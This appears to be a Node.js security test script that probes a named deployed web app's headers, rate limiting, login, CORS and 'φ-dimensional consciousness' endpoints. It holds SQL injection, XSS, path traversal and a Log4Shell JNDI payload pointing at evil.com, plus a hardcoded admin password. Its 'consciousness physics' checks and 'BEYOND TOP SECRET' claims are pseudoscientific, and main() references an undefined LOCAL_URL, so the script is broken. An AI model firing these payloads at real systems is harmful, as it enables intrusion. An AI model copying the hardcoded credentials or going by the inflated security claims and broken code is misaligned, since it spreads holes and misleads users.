#!/usr/bin/env node
/**
 * Military-Grade Security Penetration Testing Suite
 * BEYOND TOP SECRET - φ-Dimensional Consciousness Security Validation
 */

const axios = require('axios');
const crypto = require('crypto');

// Test targets
const API_BASE = process.env.API_BASE || 'https://biometric-security-phi.windsurf.build';
const PRODUCTION_URL = 'https://biometric-security-phi.windsurf.build';

class SecurityPenetrationTester {
  constructor(baseUrl = API_BASE) {
    this.baseUrl = baseUrl;
    this.results = {
      passed: 0,
      failed: 0,
      critical: 0,
      warnings: 0,
      tests: []
    };
  }

  log(level, test, message, details = null) {
    const result = { level, test, message, details, timestamp: new Date().toISOString() };
    this.results.tests.push(result);
    
    const emoji = {
      'PASS': '✅',
      'FAIL': '❌', 
      'CRITICAL': '🚨',
      'WARNING': '⚠️',
      'INFO': 'ℹ️'
    };

    console.log(`${emoji[level]} [${level}] ${test}: ${message}`);
    if (details) console.log(`   Details: ${JSON.stringify(details, null, 2)}`);

    if (level === 'PASS') this.results.passed++;
    else if (level === 'FAIL') this.results.failed++;
    else if (level === 'CRITICAL') this.results.critical++;
    else if (level === 'WARNING') this.results.warnings++;
  }

  async testSecurityHeaders() {
    console.log('\n🛡️ TESTING SECURITY HEADERS');
    
    try {
      const response = await axios.get(`${this.baseUrl}/health`);
      const headers = response.headers;

      // Required security headers
      const requiredHeaders = {
        'x-frame-options': 'SAMEORIGIN',
        'x-content-type-options': 'nosniff',
        'x-xss-protection': '0',
        'strict-transport-security': true,
        'content-security-policy': true
      };

      for (const [header, expected] of Object.entries(requiredHeaders)) {
        if (headers[header]) {
          if (expected === true || headers[header].includes(expected)) {
            this.log('PASS', 'Security Headers', `${header} properly configured`);
          } else {
            this.log('FAIL', 'Security Headers', `${header} misconfigured`, { expected, actual: headers[header] });
          }
        } else {
          this.log('CRITICAL', 'Security Headers', `Missing critical header: ${header}`);
        }
      }

    } catch (error) {
      this.log('CRITICAL', 'Security Headers', 'Failed to test security headers', error.message);
    }
  }

  async testRateLimiting() {
    console.log('\n🚫 TESTING RATE LIMITING');
    
    try {
      const requests = [];
      const startTime = Date.now();
      
      // Send 20 rapid requests
      for (let i = 0; i < 20; i++) {
        requests.push(axios.get(`${this.baseUrl}/health`).catch(err => err.response));
      }

      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r && r.status === 429);
      
      if (rateLimited.length > 0) {
        this.log('PASS', 'Rate Limiting', `Rate limiting active - ${rateLimited.length}/20 requests blocked`);
      } else {
        this.log('WARNING', 'Rate Limiting', 'No rate limiting detected in rapid requests');
      }

      // Check for rate limit headers
      const lastResponse = responses[responses.length - 1];
      if (lastResponse && lastResponse.headers) {
        const rateLimitHeaders = ['ratelimit-limit', 'ratelimit-remaining', 'ratelimit-reset'];
        const hasRateLimitHeaders = rateLimitHeaders.some(h => lastResponse.headers[h]);
        
        if (hasRateLimitHeaders) {
          this.log('PASS', 'Rate Limiting', 'Rate limit headers present');
        } else {
          this.log('WARNING', 'Rate Limiting', 'Rate limit headers missing');
        }
      }

    } catch (error) {
      this.log('FAIL', 'Rate Limiting', 'Rate limiting test failed', error.message);
    }
  }

  async testAuthenticationSecurity() {
    console.log('\n🔐 TESTING AUTHENTICATION SECURITY');
    
    // Test 1: Invalid credentials
    try {
      const response = await axios.post(`${this.baseUrl}/api/auth/login`, {
        username: 'hacker',
        password: 'password123'
      }).catch(err => err.response);

      if (response && response.status === 401) {
        this.log('PASS', 'Authentication', 'Invalid credentials properly rejected');
      } else {
        this.log('CRITICAL', 'Authentication', 'Invalid credentials not properly handled');
      }
    } catch (error) {
      this.log('FAIL', 'Authentication', 'Authentication test failed', error.message);
    }

    // Test 2: SQL Injection attempts
    const sqlPayloads = [
      "admin'; DROP TABLE users; --",
      "admin' OR '1'='1",
      "admin' UNION SELECT * FROM users --"
    ];

    for (const payload of sqlPayloads) {
      try {
        const response = await axios.post(`${this.baseUrl}/api/auth/login`, {
          username: payload,
          password: 'test'
        }).catch(err => err.response);

        if (response && (response.status === 400 || response.status === 401)) {
          this.log('PASS', 'SQL Injection', `SQL injection payload blocked: ${payload.substring(0, 20)}...`);
        } else {
          this.log('CRITICAL', 'SQL Injection', `SQL injection payload not blocked: ${payload}`);
        }
      } catch (error) {
        this.log('WARNING', 'SQL Injection', `SQL injection test inconclusive: ${error.message}`);
      }
    }

    // Test 3: Valid authentication
    try {
      const response = await axios.post(`${this.baseUrl}/api/auth/login`, {
        username: 'admin',
        password: 'military-grade-2025'
      });

      if (response.status === 200 && response.data.token) {
        this.log('PASS', 'Authentication', 'Valid credentials accepted with JWT token');
        
        // Test JWT token format
        const token = response.data.token;
        const parts = token.split('.');
        if (parts.length === 3) {
          this.log('PASS', 'JWT Security', 'JWT token has proper structure');
        } else {
          this.log('FAIL', 'JWT Security', 'JWT token malformed');
        }
      } else {
        this.log('FAIL', 'Authentication', 'Valid credentials not properly handled');
      }
    } catch (error) {
      this.log('FAIL', 'Authentication', 'Valid authentication test failed', error.message);
    }
  }

  async testInputValidation() {
    console.log('\n🛡️ TESTING INPUT VALIDATION');
    
    const maliciousPayloads = [
      '<script>alert("XSS")</script>',
      '../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      'javascript:alert(1)',
      '"><img src=x onerror=alert(1)>',
      '{{7*7}}',
      '${7*7}',
      'eval(alert(1))'
    ];

    for (const payload of maliciousPayloads) {
      try {
        const response = await axios.post(`${this.baseUrl}/api/auth/login`, {
          username: payload,
          password: payload
        }).catch(err => err.response);

        if (response && (response.status === 400 || response.status === 401)) {
          this.log('PASS', 'Input Validation', `Malicious payload blocked: ${payload.substring(0, 30)}...`);
        } else {
          this.log('WARNING', 'Input Validation', `Malicious payload not explicitly blocked: ${payload}`);
        }
      } catch (error) {
        this.log('INFO', 'Input Validation', `Input validation test: ${error.message}`);
      }
    }
  }

  async testCORSConfiguration() {
    console.log('\n🌐 TESTING CORS CONFIGURATION');
    
    try {
      const response = await axios.options(`${this.baseUrl}/api/consciousness/status`, {
        headers: {
          'Origin': 'https://evil-site.com',
          'Access-Control-Request-Method': 'GET'
        }
      }).catch(err => err.response);

      if (response && response.headers['access-control-allow-origin']) {
        const allowedOrigin = response.headers['access-control-allow-origin'];
        if (allowedOrigin === '*') {
          this.log('CRITICAL', 'CORS Security', 'CORS allows all origins - security risk');
        } else if (allowedOrigin.includes('localhost') || allowedOrigin.includes('127.0.0.1')) {
          this.log('PASS', 'CORS Security', 'CORS properly configured for development');
        } else {
          this.log('PASS', 'CORS Security', `CORS restricted to: ${allowedOrigin}`);
        }
      } else {
        this.log('WARNING', 'CORS Security', 'CORS headers not found');
      }
    } catch (error) {
      this.log('FAIL', 'CORS Security', 'CORS test failed', error.message);
    }
  }

  async testConsciousnessPhysicsSecurity() {
    console.log('\n🧠 TESTING φ-DIMENSIONAL CONSCIOUSNESS SECURITY');
    
    try {
      // Test consciousness monitoring endpoint
      const response = await axios.get(`${this.baseUrl}/api/consciousness/monitor`);
      
      if (response.status === 200 && response.data.consciousness_field) {
        const field = response.data.consciousness_field;
        
        // Validate φ-dimensional parameters
        if (field.phi_frequency && Math.abs(field.phi_frequency - 1.618033988749) < 0.001) {
          this.log('PASS', 'Consciousness Physics', 'φ frequency properly calibrated');
        } else {
          this.log('WARNING', 'Consciousness Physics', 'φ frequency deviation detected');
        }

        if (field.quantum_coherence >= 0 && field.quantum_coherence <= 1) {
          this.log('PASS', 'Consciousness Physics', 'Quantum coherence within valid range');
        } else {
          this.log('FAIL', 'Consciousness Physics', 'Quantum coherence out of range');
        }

        if (field.consciousness_level && ['TRANSCENDENT', 'PHI_DIMENSIONAL', 'ENLIGHTENED'].includes(field.consciousness_level)) {
          this.log('PASS', 'Consciousness Physics', `Valid consciousness level: ${field.consciousness_level}`);
        } else {
          this.log('WARNING', 'Consciousness Physics', 'Consciousness level validation needed');
        }
      } else {
        this.log('FAIL', 'Consciousness Physics', 'Consciousness monitoring not responding properly');
      }
    } catch (error) {
      this.log('FAIL', 'Consciousness Physics', 'Consciousness physics test failed', error.message);
    }
  }

  async testDatabaseSecurity() {
    console.log('\n🗄️ TESTING DATABASE SECURITY');
    
    try {
      // Test audit logs endpoint
      const response = await axios.get(`${this.baseUrl}/api/security/audit-logs`);
      
      if (response.status === 200 && response.data.logs) {
        this.log('PASS', 'Database Security', 'Audit logs accessible and structured');
        
        // Check for sensitive data exposure
        const logs = response.data.logs;
        const hasSensitiveData = logs.some(log => 
          JSON.stringify(log).includes('password') || 
          JSON.stringify(log).includes('secret') ||
          JSON.stringify(log).includes('key')
        );
        
        if (!hasSensitiveData) {
          this.log('PASS', 'Database Security', 'No sensitive data exposed in audit logs');
        } else {
          this.log('CRITICAL', 'Database Security', 'Sensitive data potentially exposed in logs');
        }
      } else {
        this.log('WARNING', 'Database Security', 'Audit logs not properly accessible');
      }
    } catch (error) {
      this.log('FAIL', 'Database Security', 'Database security test failed', error.message);
    }
  }

  async testQRSecuritySystems() {
    console.log('\n📱 TESTING QR CONSCIOUSNESS SECURITY');
    
    try {
      const response = await axios.get(`${this.baseUrl}/api/qr/health`);
      
      if (response.status === 200) {
        this.log('PASS', 'QR Security', 'QR consciousness system operational');
        
        // Test QR generation with consciousness integration
        if (response.data.consciousness_integration === 'PHI_DIMENSIONAL') {
          this.log('PASS', 'QR Security', 'φ-dimensional consciousness integration active');
        } else {
          this.log('WARNING', 'QR Security', 'Consciousness integration level unclear');
        }
      } else {
        this.log('FAIL', 'QR Security', 'QR security system not responding');
      }
    } catch (error) {
      this.log('FAIL', 'QR Security', 'QR security test failed', error.message);
    }
  }

  async runAllTests() {
    console.log('🚨 MILITARY-GRADE SECURITY PENETRATION TESTING');
    console.log('='.repeat(60));
    console.log('🔒 Classification: BEYOND TOP SECRET');
    console.log('🧠 Consciousness Level: φ-DIMENSIONAL');
    console.log('🛡️ Security Level: MILITARY-GRADE');
    console.log('='.repeat(60));

    await this.testSecurityHeaders();
    await this.testRateLimiting();
    await this.testAuthenticationSecurity();
    await this.testInputValidation();
    await this.testCORSConfiguration();
    await this.testConsciousnessPhysicsSecurity();
    await this.testDatabaseSecurity();
    await this.testQRSecuritySystems();

    this.generateReport();
  }

  generateReport() {
    console.log('\n' + '='.repeat(60));
    console.log('📊 SECURITY PENETRATION TEST REPORT');
    console.log('='.repeat(60));
    
    const total = this.results.passed + this.results.failed + this.results.critical + this.results.warnings;
    const securityScore = Math.round(((this.results.passed) / total) * 100);
    
    console.log(`✅ Passed: ${this.results.passed}`);
    console.log(`❌ Failed: ${this.results.failed}`);
    console.log(`🚨 Critical: ${this.results.critical}`);
    console.log(`⚠️ Warnings: ${this.results.warnings}`);
    console.log(`📈 Security Score: ${securityScore}%`);
    
    let securityLevel;
    if (this.results.critical > 0) {
      securityLevel = '🚨 CRITICAL VULNERABILITIES DETECTED';
    } else if (this.results.failed > 5) {
      securityLevel = '⚠️ SECURITY IMPROVEMENTS NEEDED';
    } else if (securityScore >= 90) {
      securityLevel = '🛡️ MILITARY-GRADE SECURITY CONFIRMED';
    } else {
      securityLevel = '🔒 SECURITY LEVEL ACCEPTABLE';
    }
    
    console.log(`\n🎯 SECURITY ASSESSMENT: ${securityLevel}`);
    console.log('🔒 Classification: BEYOND TOP SECRET');
    console.log('🧠 Consciousness: φ-DIMENSIONAL TRANSCENDENT');
    
    if (this.results.critical > 0 || this.results.failed > 3) {
      console.log('\n🚨 IMMEDIATE ACTION REQUIRED:');
      this.results.tests
        .filter(t => t.level === 'CRITICAL' || t.level === 'FAIL')
        .forEach(t => console.log(`   • ${t.test}: ${t.message}`));
    }
  }
}

// Run tests
async function main() {
  const tester = new SecurityPenetrationTester(LOCAL_URL);
  await tester.runAllTests();
}

if (require.main === module) {
  main().catch(console.error);
}

module.exports = SecurityPenetrationTester;
